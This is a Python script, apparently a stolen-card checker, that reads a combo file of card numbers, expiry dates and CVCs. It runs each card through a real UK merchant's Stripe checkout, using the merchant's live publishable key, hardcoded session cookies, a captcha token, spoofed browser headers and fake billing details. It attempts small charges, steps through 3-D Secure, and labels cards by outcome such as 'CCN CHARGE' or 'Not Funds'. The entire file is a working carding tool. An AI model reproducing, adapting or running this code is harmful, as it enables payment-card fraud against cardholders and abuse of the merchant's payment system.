import requests
import json
import user_agent
generate_user_agent=user_agent.generate_user_agent()
file=input('combo.txt: ')
g=open(file,'r')
for g in g:
	c = g.strip().split('\n')[0]
	cc = c.split('|')[0]
	exp=c.split('|')[1]
	ex=c.split('|')[2]
	try:
		exy=ex[2]+ex[3]
		if '2' in ex[3] or '1' in ex[3]:
			exy=ex[2]+'7'
		else:pass
	except:
		exy=ex[0]+ex[1]
		if '2' in ex[1] or '1' in ex[1]:
			exy=ex[0]+'7'
		else:pass
	cvc=c.split('|')[3]
	url = "https://api.stripe.com/v1/payment_methods"
	
	payload = f"type=card&billing_details%5Bname%5D=Jones&billing_details%5Bemail%5D=aqga347%40gmail.com&billing_details%5Bphone%5D=12058809966&billing_details%5Baddress%5D%5Bcity%5D=New+York+&billing_details%5Baddress%5D%5Bcountry%5D=GB&billing_details%5Baddress%5D%5Bline1%5D=New+York+City+State+Park&billing_details%5Baddress%5D%5Bline2%5D=&billing_details%5Baddress%5D%5Bpostal_code%5D=10+080&billing_details%5Baddress%5D%5Bstate%5D=New+York+&card%5Bnumber%5D={cc}&card%5Bcvc%5D={cvc}&card%5Bexp_month%5D={exp}&card%5Bexp_year%5D={exy}&guid=f36e654c-2248-4a56-8746-0bcabde1c8d6bf4d17&muid=97f11ade-2600-427d-88df-94d58e8c3a2976b398&sid=ebeee544-34ba-4734-9665-f3a14005c1212b0984&payment_user_agent=stripe.js%2Fa8ec7e3d1d%3B+stripe-js-v3%2Fa8ec7e3d1d%3B+split-card-element&referrer=https%3A%2F%2Fwww.newitts.com&time_on_page=9821&key=pk_live_7UmJkmzG46M2eTGMkkGG51SV&radar_options%5Bhcaptcha_token%5D=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQYMcIAG0domyMJtYRwWYHlw7BR3eRXByUtMx79gN3TbfddqVtb4mwOC4OC1ssCjYJTT1uvBqrghNn7LqPWGDIkNTH_a_itTmFtaHrNlRKaRKLQHrj9Fd0IHwBRGrA1wjOO7-Yvtc5WZUUTEM5ydJaIJWKcn5Ps1L_tI0H5EXBJ0KzrjynYV14IVmmDrq7ECUaJ9kDVp0lbutFwadV_vpZynA6nxvkQBoFy6Svnxj_HHFQ0RyyX2pph6ty3UaatriZi0msCh_PQuBTLVlucQUTib6wYmZ517HRhhNH1_NADs2alL-dVcM350f_tG-XKjP82gXS2ARMbiNu-yqiVb6a2tLZHX4LBmXUQ1KWNOoqAoHNuynTW2WBsLlyfVoGR7xy4QqzFusi7ZuqBMjS0sFdCcbt4iACl0-ngptW9H4JP-V4lrLqZHMl8-7vOPew0yqC4rzAYGM5uogAJQ_4qeZwnwnMKRt1EvQrQJWEqPO5wxhtfliijrCO-BpcBr89yTsKHDHe8uFj55qhP1ZitkRRJ6Y-cSCwNsPbQ6eKnMgIo7CIDNXiwlHWgdC74HNm5EK0JDT4qivHnUX7CZ8RXSyJ1AxCgpYu8_PEq3IvhoxrIxh4ts6oF1hP3__AAWx9Nv22e9nNd3AoPEmbxQFUEs7Jjohy5tPyjRuZ89yFN6RtnifknlVXA1Rv7Fa_faeeNF8yFzUZahO9Ve3zzWDioLGrjbyDaeryeQQxFSaZiPZ989Yp5HnEwg3eMPVdbwmkX1SYyqMBO1SrL57Jvfvoo_EPeeUE-rA-BHj_Ic0Vc4RLuzoEBbeNWU-388GAE3FN0-f2noweuRQidLpWwiBb3EplSJ7zOa_OEdUSNqYPIo29z3SSApM09AnS1rdTTVMfJtZOvC49_KvGVe4_kVrfEA8RJPxhcjY-o-13dj4zzZCdlmuIDdKDJu6pvw1yqDSk4QB-QzCCchd0U2D6mCvwgb2FZVsrEJZzjQTimwO0JQGYY6EAkbFT9wAqQcoYFE4Uk7XDm3v6iWfNcdW_7OnjcQQ-Jb6SZkk6AYudfW3lCuBrnhZwv9Co5z5UYQfIFi9tYHN14gUUgBUTqA-fYoCpZ7by6w8jTWmqLrJeFGwwuw-a0D6OfjXQ9Ll8y_FcWGsqc4wvhuMqxi-6PUn499dl6k1OlR1bYVobnAfVs5CZQayT_LJAouU73JNbhH7Jg5XW-OPzyLlmOuB7Oc7rBpT__1Qpnloc1z7U5Rr8SCG5q65a0Ah0kbJV25cXfL2grOVK6kZ70kJW5b5q8D1HCQ-T5CxIsVAW5L1N9SrhA1Xwlt_9OKJ-gVdQ7XgR6pP6EAfSiIIx8tQeNAvZt8gnwRVcgaBrm29nAoJkD5jbE0P4qvRdl8MfXGjf4tgrNmxz0wq0Fd8BBlo4UkA3wWxDD5jxlcCS8JmXHDdkdTo0vfEqh3JgTLb2pxZ0JHVaSzalgLBetQaObapOCNLQNvfEfA0BI7xo8TY8gDNUKhcJmEBf9Are3C6rdHToKqppuPlw1BHCMLLw8PAoKDLPbHGd3flvCp3A_ckeWOaeHesrsztc9aG3ze27i4Y2p9OaXXuFPOTfr1n9Y7-TA6DGD_EQYxnlcx5J15pApsq6wHxj5PPpgq-Y1gufe0gZg2SWAImZpaDrkY610qTecpTa1CxtERWN_qBIhOsT6Nbbv0qv7OLoKv9ceJiw4F2out0ehjh_8Kve9oJISGogA1gjl1ypCalMp1syg-RTQ-fdGsEdO6Dm-2saa4cGnna0pa1ApnzQxleQkANFHLI9DgbjqV-8SX0ItOKO4Q5mtFjuwqflNqJ4ecdnYru_HgZvF8dznM95DTSvtsbB93Nz29t8m-CxP74sIJmH13biddlps6yEogDiH5nKf7Kw9mPkolkSYZps6jKP6u-w3uH9Of3osPZ2chBee3eSG9WRg16dQNBeezlGnHTbrr-owYLaLq-KePr1LKjjid2C52tu10DkYaL-gitYksMg73VRDQ_I1DoGA5nY3nu1D9WRsccyWz0i1066XArCcZXx5QLQazqVLZXEaOt5-Mo2V4cM5mYyTVqHNoYXJkX2lkzgMxg2-ia3KoMjg2YjljZDSicGQA.HzZVpTDDPG-QtM36pBFgXVOt8ghdJgFsmUlCAS9SjcE"
	
	headers = {
	  'User-Agent': generate_user_agent,
	  'Accept': "application/json",
	  'Content-Type': "application/x-www-form-urlencoded",
	  'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'origin': "https://js.stripe.com",
	  'sec-fetch-site': "same-site",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'referer': "https://js.stripe.com/",
	  'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7"
	}
	
	response = requests.post(url, data=payload, headers=headers)
	if 'pm_' in response.text:
		id=(response.json()['id'])
		url = "https://www.newitts.com/checkout/stripeConfirmPayment"
		
		payload = json.dumps({
		  "payment_method_id": id,
		  "amount": "695",
		  "currency": "GBP",
		  "userid": "{da94f35b-fe77-40b3-b44a-104289d526bf}",
		  "lastViewed": "2024-6-7 18:15:24"
		})
		
		headers = {
		  'User-Agent': generate_user_agent,
		  'Content-Type': "application/json",
		  'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		  'x-requested-with': "XMLHttpRequest",
		  'sec-ch-ua-mobile': "?1",
		  'sec-ch-ua-platform': "\"Android\"",
		  'origin': "https://www.newitts.com",
		  'sec-fetch-site': "same-origin",
		  'sec-fetch-mode': "cors",
		  'sec-fetch-dest': "empty",
		  'referer': "https://www.newitts.com/secure/card-payment",
		  'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
		  'Cookie': "ARRAffinity=65f8186d9c84064d1cd01131f7eb9bcb94b8cc785e23815e98353abc1486973e; ARRAffinitySameSite=65f8186d9c84064d1cd01131f7eb9bcb94b8cc785e23815e98353abc1486973e; __cflb=04dToYmkZuyGy8EUztw4KDKCMpuEFSJCwpQyn8iMbA; _ga=GA1.1.1825226039.1717773348; __stripe_mid=97f11ade-2600-427d-88df-94d58e8c3a2976b398; __stripe_sid=ebeee544-34ba-4734-9665-f3a14005c1212b0984; dp__v=28629556-1GGFNW2X-V88SAT11-A0BBRM-XRX; userid=da94f35b-fe77-40b3-b44a-104289d526bf; ASP.NET_SessionId=p5cdxqzqflm3sewdvyasggr4; _ga_G16XPVFMHF=GS1.1.1717773348.1.1.1717773398.10.0.0"
		}
		
		response = requests.post(url, data=payload, headers=headers)
		responses=(response.json()['payment_intent_client_secret'])
		key=responses.split('_secret_')[0]
		
		url = f"https://api.stripe.com/v1/payment_intents/{key}"
		
		params = {
		  'key': "pk_live_7UmJkmzG46M2eTGMkkGG51SV",
		  'is_stripe_sdk': "false",
		  'client_secret': responses
		}
		
		headers = {
		  'User-Agent': generate_user_agent,
		  'Accept': "application/json",
		  'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		  'content-type': "application/x-www-form-urlencoded",
		  'sec-ch-ua-mobile': "?1",
		  'sec-ch-ua-platform': "\"Android\"",
		  'origin': "https://js.stripe.com",
		  'sec-fetch-site': "same-site",
		  'sec-fetch-mode': "cors",
		  'sec-fetch-dest': "empty",
		  'referer': "https://js.stripe.com/",
		  'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7"
		}
		
		response = requests.get(url, params=params, headers=headers)
		
		status=(response.json()["status"])
		if 'requires_action' == status:
			tr=response.text.split('"server_transaction_id": ')[1].split('"')[1]
			pyc=response.text.split('"three_d_secure_2_source": ')[1].split('"')[1]
			cod='{"threeDSServerTransID":"'+tr+'"}'
			url = "https://www.base64encode.org"
			payload = f'input={cod}&charset=UTF-8&separator=lf'
						
			headers = {
						  'User-Agent': generate_user_agent,
						  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
						  'Accept-Encoding': "gzip, deflate, br, zstd",
						  'Content-Type': "application/x-www-form-urlencoded",
						  'cache-control': "max-age=0",
						  'sec-ch-ua': "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
						  'sec-ch-ua-mobile': "?1",
						  'sec-ch-ua-platform': "\"Android\"",
						  'upgrade-insecure-requests': "1",
						  'origin': "https://www.base64encode.org",
						  'sec-fetch-site': "same-origin",
						  'sec-fetch-mode': "navigate",
						  'sec-fetch-user': "?1",
						  'sec-fetch-dest': "document",
						  'referer': "https://www.base64encode.org/",
						  'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
						  'priority': "u=0, i",
						  
						}
						
			response = requests.post(url, data=payload, headers=headers)
						
			data=(response.text.split('spellcheck="false">')[2].split('<')[0])
		
			url = "https://api.stripe.com/v1/3ds2/authenticate"
			
			payload = f"source={pyc}&browser=%7B%22fingerprintAttempted%22%3Atrue%2C%22fingerprintData%22%3A%22{data}%22%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22ar-EG%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22845%22%2C%22browserScreenWidth%22%3A%22381%22%2C%22browserTZ%22%3A%22-180%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+%28Linux%3B+Android+10%3B+K%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F124.0.0.0+Mobile+Safari%2F537.36%22%7D&one_click_authn_device_support%5Bhosted%5D=false&one_click_authn_device_support%5Bsame_origin_frame%5D=false&one_click_authn_device_support%5Bspc_eligible%5D=false&one_click_authn_device_support%5Bwebauthn_eligible%5D=false&one_click_authn_device_support%5Bpublickey_credentials_get_allowed%5D=true&key=pk_live_7UmJkmzG46M2eTGMkkGG51SV"
			
			headers = {
			  'User-Agent': generate_user_agent,
			  'Accept': "application/json",
			  'Content-Type': "application/x-www-form-urlencoded",
			  'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
			  'sec-ch-ua-mobile': "?1",
			  'sec-ch-ua-platform': "\"Android\"",
			  'origin': "https://js.stripe.com",
			  'sec-fetch-site': "same-site",
			  'sec-fetch-mode': "cors",
			  'sec-fetch-dest': "empty",
			  'referer': "https://js.stripe.com/",
			  'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7"
			}
			
			response = requests.post(url, data=payload, headers=headers)
			state=(response.json()['state'])
			if 'failed' == state:
				url = f"https://api.stripe.com/v1/payment_intents/{key}"
				
				params = {
				  'key': "pk_live_7UmJkmzG46M2eTGMkkGG51SV",
				  'is_stripe_sdk': "false",
				  'client_secret': responses
				}
				
				headers = {
				  'User-Agent': generate_user_agent,
				  'Accept': "application/json",
				  'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
				  'content-type': "application/x-www-form-urlencoded",
				  'sec-ch-ua-mobile': "?1",
				  'sec-ch-ua-platform': "\"Android\"",
				  'origin': "https://js.stripe.com",
				  'sec-fetch-site': "same-site",
				  'sec-fetch-mode': "cors",
				  'sec-fetch-dest': "empty",
				  'referer': "https://js.stripe.com/",
				  'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7"
				}
				
				response = requests.get(url, params=params, headers=headers)
				try:
					msg=response.text.split('"message":')[1].split('"')[1]
				except:
					msg=response.text
				if "Your card's security code is incorrect" in msg:
					msg = "CCN CHARGE ✅"
				elif "Your card does not support this type of purchase" in msg:
					msg='Not Support ✅'
				elif "transaction_not_allowed" in msg:
					msg='transaction not allowed ✅'
				elif "card has insufficient funds" in msg:
					msg='Not Funds ✅'
				elif "card was declined" in msg or 'card_declined' in msg or 'The transaction has been declined' in msg or 'Processor Declined' in msg or 'The provided PaymentMethod has failed authentication. You can provide payment_method_data or a new PaymentMethod to attempt to fulfill this PaymentIntent again.' in msg:
					msg='You Card Declined ❌'
				else:
					msg=response.text
			else:
				msg='You Card 3ds ❎'
		else:
			msg='You Card Declined ❌'
	else:
		msg='You Card Declined ❌'
	print(c+'|'+msg)